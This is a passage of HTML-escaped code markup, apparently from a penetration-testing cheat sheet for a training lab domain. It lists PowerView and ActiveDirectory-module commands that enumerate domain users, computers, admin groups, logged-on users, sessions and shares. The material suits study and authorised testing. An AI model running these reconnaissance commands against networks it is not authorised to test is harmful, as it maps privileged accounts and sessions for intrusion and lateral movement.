&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Test it via getting domain NetBios name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">gwmi &lt;/span>&lt;span class="n">Win32_NTDomain&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DomainName&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomain&lt;/span> &lt;span class="n">-Identiy&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomain&lt;/span> &lt;span class="n">-Identiy&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get domain SID for the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainSID&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-ADDomain&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DomainSID&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get domain policy for the current domain or for a trusted domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainPolicy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-DomainPolicy&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="s2">&amp;#34;System Access&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-DomainPolicy&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="s2">&amp;#34;Kerberos Policy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-DomainPolicy&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="s2">&amp;#34;System Access&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-DomainPolicy&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="s2">&amp;#34;Kerberos Policy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get Domain Controllers for the current or for a trusted domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainController&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainController&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomainController&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomainController&lt;/span> &lt;span class="n">-DomainName&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span> &lt;span class="n">-Discover&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the list of users in the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">samaccountname&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">samaccountname&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">description&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">logoncount&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pwdlastset&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">samaccountname&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">:cmd.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user /domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get list of all properties for users in the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-UserProperty&lt;/span> &lt;span class="c"># All properties&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-UserProperty&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="s2">&amp;#34;pwdlastset&amp;#34;&lt;/span> &lt;span class="c"># Only pwdlastset property&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-First&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-Member&lt;/span> &lt;span class="n">-MemberType&lt;/span> &lt;span class="n">Property&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">expression&lt;/span>&lt;span class="p">={[&lt;/span>&lt;span class="no">datetime&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">fromFileTime&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">pwdlastset&lt;/span>&lt;span class="p">)}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Search for a particular string in a users&amp;rsquo; attribute:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-UserField&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-UserField&lt;/span> &lt;span class="n">-SearchField&lt;/span> &lt;span class="s2">&amp;#34;Description&amp;#34;&lt;/span> &lt;span class="n">-SearchTerm&lt;/span> &lt;span class="s2">&amp;#34;built&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Description -like &amp;#34;*built*&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">Description&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Description&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get a list of computers in the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-OperatingSystem&lt;/span> &lt;span class="s2">&amp;#34;*Server 2016*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-Ping&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Get computer IPs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nv">$ip&lt;/span>&lt;span class="p">=[&lt;/span>&lt;span class="no">System.Net.Dns&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">GetHostAddresses&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">IPAddressToString&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">`t&lt;/span>&lt;span class="s2"> : &amp;#34;&lt;/span> &lt;span class="nv">$ip&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;OperatingSystem -like &amp;#34;*Server 2016*&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">OperatingSystem&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">OperatingSystem&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">DNSHostName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Test-Connection&lt;/span> &lt;span class="n">-Count&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DNSHostName&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Search for a particular string in a computer attribute:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-ComputerField&lt;/span> &lt;span class="n">-SearchField&lt;/span> &lt;span class="s2">&amp;#34;OperatingSystem&amp;#34;&lt;/span> &lt;span class="n">-SearchTerm&lt;/span> &lt;span class="s2">&amp;#34;windows&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Description -like &amp;#34;*built*&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">Description&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Description&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get groups in the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;*admin*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroup&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroup&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name -like &amp;#34;*admin*&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">:cmd.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net group /domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net group &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all the members of a group:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-Recursive&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">-Recursive&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the group membership for a user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADPrincipalGroupMembership&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get local groups on localhost or an specified computer (need local admin rights on the target):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-ListGroups&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop Users&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: cmd.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net localgroup
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all effective local/domain users/groups that can access the machine with local administrative privileges:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get currently logged users on a computer (need local admin rights on the target):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLoggedon&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get active sessions on the host:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get currently locally logged users on a computer (need remote registry - default in server OS):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-LoggedOnLocal&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-LoggedOnLocal&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the last logged user on a computer (need local admin rights on the target):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-LastLoggedOn&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List RDP sessions inside a computer (need local admin rights on the target):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetRDPSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find shares on host in current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ShareFinder&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ShareFinder&lt;/span> &lt;span class="n">-ExcludeStandard&lt;/span> &lt;span class="n">-ExcludePrint&lt;/span> &lt;span class="n">-ExcludeIPC&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
